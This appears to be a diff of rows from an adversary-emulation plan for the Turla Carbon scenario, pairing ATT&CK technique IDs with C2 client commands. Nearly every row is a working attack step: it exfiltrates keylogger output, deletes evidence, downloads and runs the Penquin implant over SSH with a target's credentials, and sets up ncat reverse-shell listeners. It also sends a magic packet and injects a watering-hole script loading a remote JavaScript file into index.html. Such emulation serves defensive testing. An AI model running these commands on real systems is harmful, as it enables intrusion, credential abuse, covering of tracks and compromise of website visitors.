+turla_carbon,turla_carbon,Turla - Carbon,unknown,35,438939c8-e95a-4fbd-b659-06f0b0b72e47,T1056.001,Collection,8.A.2,Input Capture: Keylogging,Exfiltrate keylogged data (Adversary),Task the CARBON-DLL implant to exfiltrate the data written to the keylogger file,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 2, ""cmd"": ""type %temp%\\~DFA512.tmp""}' --task-wait-timeout 200","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 2, ""cmd"": ""type %temp%\\~DFA512.tmp""}' --task-wait-timeout 200"
+turla_carbon,turla_carbon,Turla - Carbon,8,36,f8ab9b59-89a7-4c25-90bf-0c2485785a36,8.A.3,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,Remove keylogging evidence (Adversary),Task the CARBON-DLL implant to remove the keylogger and keylogger output file.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 3, ""cmd"": ""del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 3, ""cmd"": ""del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,9,37,4d5197fa-4ba7-4bfd-9c91-1697ce0a80a4,9.A.1,Command and Control,T1105,Ingress Tool Transfer,Download Penquin (Adversary),Task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 4, ""payload"": ""hsperfdata.zip"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp504e.tmp"", ""cmd"": ""dir C:\\Windows\\Temp\\tmp504e.tmp""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 4, ""payload"": ""hsperfdata.zip"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp504e.tmp"", ""cmd"": ""dir C:\\Windows\\Temp\\tmp504e.tmp""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,9,38,d760974d-6466-40b9-8532-b6be578428fc,9.A.2,Command and Control,T1105,Ingress Tool Transfer,Download pscp.exe (Adversary),Task the implant to download pscp.exe,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 5, ""payload"": ""pscp.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\pscp.exe"", ""cmd"": ""move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe &...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 5, ""payload"": ""pscp.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\pscp.exe"", ""cmd"": ""move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,9,39,83a79c7d-721c-44ac-b8d5-d9ba2bc84852,9.A.3,Lateral Movement,T1021.004,Remote Services: SSH,Copy Penquin to Apache web server (Adversary),Task the implant to copy Penquin to the Apache web server using the third target user's credentials.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 6, ""cmd"": ""echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.serve...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 6, ""cmd"": ""echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,9,40,4468cc14-8e77-44cd-93de-b892253b3e27,9.A.4,Command and Control,T1105,Ingress Tool Transfer,Download plink.exe (Adversary),Task the implant to download plink.exe,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.e...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,9,41,8c6a546b-e03b-4761-b422-8eaf40f59580,9.A.5,Lateral Movement,T1021.004,Remote Services: SSH,Execute Penquin (Adversary),Task the implant to execute Penquin,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Win...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}""}' --task-wait-timeout 200; sleep 60;"
+turla_carbon,turla_carbon,Turla - Carbon,9,42,1fe4de9d-d8d3-4188-8a2a-6ff42394400c,9.A.6,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,Clean up downloaded files (Adversary),Task the implant to clean up downloaded files,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,43,00a08c4d-d023-4b2a-8244-651f37d23e2c,x,x,x,x,Ncat listener to connect to Penquin's reverse shell (Adversary),Fork a process to set up a Ncat listener for Penquin's reverse shell to connect to,"exec-background bash -c ""mkfifo input_pipe; mkfifo output_pipe; ncat -k -l 12345 0<output_pipe | ncat -lv 8081 1>output_pipe & tail -f input_pipe | ncat localhost 12345 &""","exec-background bash -c ""mkfifo input_pipe; mkfifo output_pipe; ncat -k -l 12345 0<output_pipe | ncat -lv 8081 1>output_pipe & tail -f input_pipe | ncat localhost 12345 &"""
+turla_carbon,turla_carbon,Turla - Carbon,10,44,7086ff8c-da64-4b85-a3ee-6157fc0e0a70,10.A.1,Command and Control,T1205,Traffic Signaling,Send magic packet to Apache server (Adversary),Send the magic packet to the Apache server using the `sendPacket.py` utility,sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64,sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64
+turla_carbon,turla_carbon,Turla - Carbon,10,45,4b6ed411-6b13-484e-bed6-60b07562d6de,10.A.4,Initial Access,T1189,Drive-By Compromise,Add watering hole redirection (Adversary),Send the command to ncat to add the watering hole redirection to `index.html`,"echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = ...","echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>\"" >> /var/www/html/index.html"" > input_pipe;
+echo exit > input_pipe;
+rm input_pipe output_pipe;
+ps aux | grep '[n]cat' | awk '{print $2}' | while read line; do kill $line; done"
